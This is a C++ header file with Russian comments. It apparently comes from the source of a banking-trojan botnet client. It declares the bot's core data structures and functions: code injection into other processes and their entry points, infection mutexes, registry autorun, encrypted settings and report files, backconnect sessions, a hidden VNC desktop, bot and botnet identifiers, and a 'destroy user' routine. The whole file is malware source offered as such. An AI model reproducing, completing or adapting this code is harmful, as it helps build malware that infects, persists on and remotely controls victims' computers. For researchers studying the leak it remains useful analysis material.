/*
  Ядро клиента, основные инициализации.

  Примечание кастельно coreData.modules.kernel32:
  В приципе при инжекте кода в другие процессы библиотека kernel32.dll может быть не загружена,
  и инжект обламается. Однако по текщем результатам теста, для пользователских процессов
  kernel32.dll загружается вместе с ntdll.dll, и беспокоиться об этой проблеме не стоит.
*/
#pragma once

#include "..\common\malwaretools.h"
#include "..\common\ntdll.h"
#include "..\common\wininet.h"
#include "..\common\generateddata.h"

//Размер буфера в символах для значения реестра.
#define CORE_REGISTRY_VALUE_BUFFER_SIZE 10       

//Размер буфера в символах для ключа реестра.
#define CORE_REGISTRY_KEY_BUFFER_SIZE (sizeof(PATH_REGKEY) + CORE_REGISTRY_VALUE_BUFFER_SIZE + 1)

//Настройки сохраняемые в PE файле.
#pragma pack(push, 1)
typedef struct
{
  //Привязка.
  DWORD size;           //Полный размер настроек.
  WCHAR compId[60];     //CompID.
  GUID guid;            //Бинарный GUID ассоциации с ОС.
  Crypt::RC4KEY rc4Key; //Ключ шифрования для ОС.

  //Данные о путях.
  struct
  {
    char coreFile[20];                                      //Отностилеьный путь лоадера. (6(dir) + 1(\) + 5(name) + 4(.exe) + 1(\0))
    char reportFile[20];                                    //Отностилеьный путь для отчетов. (6(dir) + 1(\) + 5(name) + 4(.ext) + 1(\0))
    char regKey[CORE_REGISTRY_VALUE_BUFFER_SIZE];           //Относительный путь в реестре. (6(dir))
    char regDynamicConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //Занчение в реестре для хранения концигурации.
    char regLocalConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE];   //Занчение в реестре для хранения локальной конфигурации.
    char regLocalSettings[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //Занчение в реестре для хранения настроек.
  }userPaths;

  DWORD processInfecionId; //ID для генерации мютекса зараженных процессов.
  DWORD storageArrayKey;   //XOR ключ для хранения отчетов.
}PESETTINGS;
#pragma pack(pop)

//Структура содержащая основные данные для текущего процесса.
typedef struct
{
  //////////////////////////////////////////////////////////////////////////////////////////////////
  // 'on_all'   - обновляются при любом запуске.
  // 'on_copy'  - обновляются в ходе копирования модуля. И также как и on_start.
  // 'on_start' - изменяются только при номарльном запуске, иначе сохраняются из модуля в модуль.
  //////////////////////////////////////////////////////////////////////////////////////////////////

  /*on_copy*/DWORD proccessFlags; //Персональные данные процесса.

  //Данные текущего юзера.
  struct
  {
    /*on_all*/TOKEN_USER *token; //Токен текушего юзера.
    /*on_all*/DWORD sidLength;   //Длина SID в pTokenUser.
    /*on_all*/DWORD id;          //CRC32 для SID в pTokenUser.
    /*on_all*/DWORD sessionId;   //ID сессии.
  }currentUser;

  struct
  {
    /*on_copy*/HMODULE current;
    /*on_all*/ HMODULE kernel32;
    /*on_all*/ HMODULE ntdll;
  }modules;

  //Функции для импорта из ntdll.dll.
# pragma pack(push, 1)
  struct
  {
    /*on_all*/ntdllNtCreateThread            ntCreateThread;      //Проверять на NULL, перед доступом.
    /*on_all*/ntdllNtCreateUserProcess       ntCreateUserProcess; //Проверять на NULL, перед доступом.
    /*on_all*/ntdllNtQueryInformationProcess ntQueryInformationProcess;
    /*on_all*/void *                         rtlUserThreadStart;
#   if(0)
    /*on_all*/ntdllNtQueryDirectoryFile      ntQueryDirectoryFile;
#   endif
#   if defined HOOKER_LDRLOADDLL
    /*on_all*/ntdllLdrLoadDll                ldrLoadDll;
    /*on_all*/ntdllLdrGetDllHandle           ldrGetDllHandle;
#   endif
#   if defined HOOKER_NTCREATEFILE
    /*on_all*/ntdllNtCreateFile              ntCreateFile;
#   endif
  }ntdllApi;
# pragma pack(pop)

  //Атрибуты доступа.
  struct
  {
    /*on_all*/SECURITY_ATTRIBUTES saAllowAll;
    /*on_all*/SECURITY_DESCRIPTOR sdAllowAll;
    /*on_all*/void *buf;
  }securityAttributes;

  //Пути.
  struct
  {
    /*on_all*/LPWSTR process;         //Полный путь текушего файла.
    /*on_start*/WCHAR home[MAX_PATH]; //Домашняя директория.
  }paths;

  /*on_all*/DWORD winVersion;           //Версия винды.
  /*on_all*/BYTE integrityLevel;        //Уровень приложения.
  /*on_all*/DWORD pid;                  //ID этого процесса.
  /*on_all*/LPSTR httpUserAgent;        //HTTP юзер-агент, перед доступом к переменной нужно 
                                        //вызвать Core::initHttpUserAgent();
  /*on_start*/GUID osGuid;              //GUID для OS.
  /*on_start*/PESETTINGS peSettings;    //Эти данные храняться шифроваными, их можно получить через
                                        //Core::getPeSettings(). ВНИМАНИЕ! Core::init() не получает
                                        //ее самостоятельно.
  /*on_start*/WCHAR installId[40];      //ID инстялатора для установки в качестве обнавления.
  
  //Данные для ускорения нахождения базовой конфигурации.
  struct
  {
    /*on_start*/DWORD xorKey;   //XOR ключ (размер больше или равен size).
  }baseConfigInfo;

  //Глобальные объекты.
  struct
  {
    /*on_copy*/HANDLE stopEvent;        //Сигнал для остановки глобалных потоков бота.
    /*on_copy*/HANDLE stopedEvent;      //Сигнал об остановке глобалных потоков бота. Пока атуально 
                                        //только для wow64.
  }globalHandles;
}COREDATA;
extern COREDATA coreData;

namespace Core
{
  //ID объектов.
  enum
  {
    OBJECT_ID_LOADER                = 0x32901130, //Загрузчик кода во все процессы (Мютекс).
    OBJECT_ID_LOADER_READY          = 0x1A43533F, //Загрузчик кода загружен (Событие).
    OBJECT_ID_INSTALLER             = 0x8889347B, //Инсталятор бота в систему (Мютекс).
    OBJECT_ID_CONTROL_INFECTION     = 0x19367401, //Поток контроля состояния бота (заражение потоков, мютекс).
    OBJECT_ID_CONTROL_AUTORUN       = 0x19367402, //Поток контроля состояния бота (автозапуск, мютекс).
    OBJECT_ID_TCP_SERVER            = 0x743C152E, //Поток TCP сервера (Мютекс).
    OBJECT_ID_BACKCONNECT_CONTROL   = 0x743C1521, //Поток контроля backconect соддинений (Мютекс).
    OBJECT_ID_SERVER_SESSION_REPORT = 0x78D0C214, //Поток сессий с сервером для отправки отчетов (Мютекс).
    OBJECT_ID_SERVER_SESSION_STATUS = 0x78D0C215, //Поток сессий с сервером для отправки статуса (Мютекс).
    OBJECT_ID_DYNAMIC_CONFIG        = 0x909011A5, //Поток обновление динамической конфигурации (Мютекс).
    OBJECT_ID_BOT_STATUS            = 0x84939312, //Статус бота в текущей системе (ID).
    OBJECT_ID_BOT_STATUS_SECRET     = 0x78F16360, //Статус бота в текущей системе (ID).
    OBJECT_ID_REG_AUTORUN           = 0xFF220829, //Объект автозапуска (реестр).
    OBJECT_ID_REPORTFILE            = 0x8793AEF2, //Доступ к файлу отчета (Мютекс).
    OBJECT_ID_LOCALCONFIG           = 0x12E82136, //Доступ к локальному конфигу в реестре (Мютекс).
    OBJECT_ID_LOCALSETTINGS         = 0x12E82137, //Доступ к локальноым настройкам в реестре (Мютекс).
    OBJECT_ID_REMOTESCRIPT          = 0x8387A395, //Исполнение скрипта (Мютекс).
    OBJECT_ID_VNC_MESSAGE           = 0x84889911, //Оконное сообщение для VNC.
    OBJECT_ID_VNC_EVENT             = 0x84889912, //Событие оконного сообщение для VNC (Событие).
    OBJECT_ID_VNC_PAINT_MUTEX       = 0x1898B122, //Мютекс риснования окон для VNC (Мютекс).
    OBJECT_ID_VNC_DESKTOP           = 0x2937498D, //Рабочий стол для VNC.
    OBJECT_ID_VNC_MAPFILE           = 0x9878A222, //Map-файл для VNC (Объект).
    OBJECT_ID_VNC_GLOBALDATA_MUTEX  = 0x18782822, //Мютекс доступа к глобальным объектам VNC (Мютекс).
  };
  
  //Флаги для coreData.processFlags.
  enum
  {
    /*
      Процесс под WOW64, флаг может присутвовать только при инциализации с INITF_NORMAL_START. 
    */
#   if !defined _WIN64
    CDPF_WOW64                            = 0x001,
#   endif
    
    /*
      Флаг актуален только для использования в первичном процессе бота. Указывает не вызывать
      ExitProcess() в первичном потоке бота, а вместо этого вызвать Sleep(INIFINITE).
    */
    CDPF_NO_EXITPROCESS                   = 0x002,
    
    /*
      Процесс под VNC-сервером.
    */
#   if(BO_VNC > 0)    
    CDPF_VNC_ACTIVE                       = 0x004,
#   endif    

    /*
      Запретить создание процессов.
    */
    CDPF_DISABLE_CREATEPROCESS            = 0x010,
    
    /*
      Права процесса на функции TCP сервера.
    */
    CDPF_RIGHT_TCP_SERVER                 = 0x020,

    /*
      Права процесса на устанвоку соединений с сервером.
    */
    CDPF_RIGHT_SERVER_SESSION             = 0x040,

    /*
      Права процесса на отслеживание цельности бота.
    */
    CDPF_RIGHT_CONTROL                    = 0x080,

    /*
      Права процесса на бэкконект.
    */
    CDPF_RIGHT_BACKCONNECT_SESSION        = 0x100,
    
    /*
      Все права.
    */
    CDPF_RIGHT_ALL                        = CDPF_RIGHT_TCP_SERVER |
                                            CDPF_RIGHT_SERVER_SESSION |
                                            CDPF_RIGHT_CONTROL |
                                            CDPF_RIGHT_BACKCONNECT_SESSION,

  /*
    Маска, которая должна наследоваться от процесса к процессу.
  */
  CDPT_INHERITABLE_MASK                   = CDPF_DISABLE_CREATEPROCESS   
#                                           if(BO_VNC > 0)    
                                            | CDPF_VNC_ACTIVE
#                                           endif    
  };

  //Флаги для init().
  enum
  {
    INITF_NORMAL_START        = 0x0, //Запуск кода как процесса.
    INITF_INJECT_START        = 0x1, //Запуск кода как инжекта.
    INITF_HOOKS_FOR_USER      = 0x2, //Установить польховательские хуки.
  };
  
  //Типы для getPeSettingsPath().
  enum
  {
    PSP_QUICKSETTINGSFILE, //В настоящее время, просто файл домашней страницы браузеров.
    PSP_COREFILE,          //PESETTINGS::userPaths.core.
    PSP_REPORTFILE,        //PESETTINGS::userPaths.other.
    PSP_REGKEY             //PESETTINGS::userPaths.regKey.
  };

  //Типы для getBinaryDataFromRegistry().
  enum
  {
    RV_DYNAMICCONFIG, //PESETTINGS::userPaths.regDynamicConfig.
    RV_LOCALCONFIG,   //PESETTINGS::userPaths.regLocalConfig.
    RV_LOCALSETTINGS  //PESETTINGS::userPaths.regLocalSettings.
  };

  //Типы сообщения для showInfoBox().
  enum
  {
    SIB_BOT_INFO,         //Базовая информация о боте.
    SIB_CRYPT_PROTECTION, //Соббщиение о неверном крипте.
  };

  /*
    Инициализация.

    IN flags - флаги INITF_*. Флаги INITF_HOOKS_FOR_*, не могут использоваться одновременно.

    Return   - true - в случаи успеха,
               false - в случаи ошибки.

    ЗАМЕЧЕНИЕ: uninit() должена вызываться не зависимо от возращаемого значение этой функции.
  */
  bool init(DWORD flags);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Инициализация coreData.httpUserAgent. Необходимо вызывать эту функцию перед доступом к 
    coreData.httpUserAgent.
  */
  void initHttpUserAgent(void);

  /*
    Устанвока значений по умолчанию для Wininet::CALLURLDATA.

    OUT cud - структура для обработки.
  */
  void initDefaultCallUrlData(Wininet::CALLURLDATA *cud);

  /*
    Создание уникального мютекса процесса.

    IN pid - ID процесса.

    Return - хэндл мютекса в случаи успеха,
             NULL - если мютекс уже сущетвует, или произошла ошибка.
  */
  HANDLE createMutexOfProcess(DWORD pid);

  /*
    Генерация имени объекта ядра.

    IN id              - OBJECT_ID_*.
    OUT buffer         - имя (буфер не менее 50 символов).
    IN objectNamespace - MalwareTools::KON_*.
  */
  void generateObjectName(DWORD id, LPWSTR buffer, BYTE objectNamespace);

  /*
    Ожидание освобождения мютекса и его захват.

    IN id              - OBJECT_ID_*.
    IN objectNamespace - MalwareTools::KON_*.

    Return             - хэндл мютекса.

    Примечание: Для освобождения мютекса необходимо вызвать Sync::_freeMutex().
  */
  HANDLE waitForMutexOfObject(DWORD id, BYTE objectNamespace);
  
  /*
    Инициализация новой копии модуля.

    IN process       - процесс.
    IN processMutex  - мютекс нового процесса.
    IN proccessFlags - данные для нового coreData.proccessFlags, текщие данные наследуются по маске
                       CDPT_INHERITABLE_MASK.

    Return           - адрес модуля в процессе process в случаи успеха,
                       NULL - в случаи ошибки.
  */
  void *initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags);

  /*
    Отключает отоброжение сообщений об различных ошибках для текущего процесса.
    
    Return - предыдыдущие флаги ошибок SEM_*.
  */
  DWORD disableErrorMessages(void);

  /*
    Подмена перехваченой функции на оригинальну, если такая импортируется через coreData.

    IN oldFunction - адрес текущей функции.
    IN newFunction - адрес новой функции.
  */
  void replaceFunction(const void *oldFunction, const void *newFunction);

  /*
    Функция для проверки, что текщее ядро является актвиным и должно предоставлять функционал.
    (напаример если это бот быдет обнволен более новой версией,ядро будет не актвино).

    Return - true - актвино,
             false - не актвино.
  */
  bool isActive(void);
  
  /*
    Уничтожение функции, путем забивания ее произволными символами.

    IN p - функция.
  */
  void _destroyFunction(void *p);

  /*
    Генерация индефикатора компьютера.

    OUT buf - буфер для индефикатора, как минимум 60 символов.
  */
  void _generateBotId(LPWSTR buf);

  /*
    Получение базовой конфигурации.
    
    OUT bc - BASECONFIG.
  */
  void getBaseConfig(BASECONFIG *bc);

  /*
    Получение PESETTINGS.
    
    OUT ps - PESETTINGS.
  */
  void getPeSettings(PESETTINGS *ps);

  /*
    Получает полный путь для пути записанном в PESETTINGS.

    IN type  - тип PSP_*.
    OUT path - путь.
  */
  void getPeSettingsPath(DWORD type, LPWSTR path);
  
  /*
    Загрузка получение данных реестра для BDR_*.

    IN type   - тип занчения RV_*.
    OUT key   - ключ реестра. Размер буфера CORE_REGISTRY_KEY_BUFFER_SIZE.
    OUT value - значение реестра. Размер буфера CORE_REGISTRY_VALUE_BUFFER_SIZE.
  */
  void getRegistryValue(DWORD type, LPWSTR key, LPWSTR value);
  
  /*
    Получение имени текущего ботнета.

    OUT name - буффер.
  */
  void getCurrentBotnetName(LPWSTR name);
  
  /*
    Получение данных из оверлея.
    
    IN image           - память.
    IN OUT overlaySize - на входе - размер памяти, на выходе размер данных оверлея.

    Return             - оверлей, нужно освободить через Mem. Или NULL - в случаи ошибки.
  */
  void *getBaseOverlay(const void *mem, LPDWORD size);
  
  /*
    Сохранение данных в оверлей.

    IN image    - память.
    IN size     - размер памяти.
    IN data     - оверлей.
    IN dataSize - размер оверлея.

    Return      - true - в случаи успеха,
                  false - в случаи ошибки.
  */
  bool setBaseOverlay(void *mem, DWORD size, const void *data, DWORD dataSize);

  /*
    Ожидание запуска серисов ядра в текщем процессе.

    IN waitStop - true - ожидать завершения всех потоков сервисов,
                  false - выйти из функции сразу после создания сервисов.
  */
  void createServices(bool waitStop);

  /*
    Уничтожение текущего юзера.
  */
  bool destroyUser(void);

  /*
    Вывод информации о сборке бота.

    IN type - SIB_*.
    
    Return  - true - в случаи успеха,
              false - в случаи ошибки.
  */
  bool showInfoBox(BYTE type);

  /*
    Точка входя инжекта в качестве точки входа модуля.

    Return - код возврата.
  */
  int WINAPI _injectEntryForModuleEntry(void);

  /*
    Точка входя инжекта в качестве точки входа потока.

    Return - код возврата.
  */
  DWORD WINAPI _injectEntryForThreadEntry(void *);

  /*
    Основная точка входа.
  */
  void WINAPI _entryPoint(void);
};
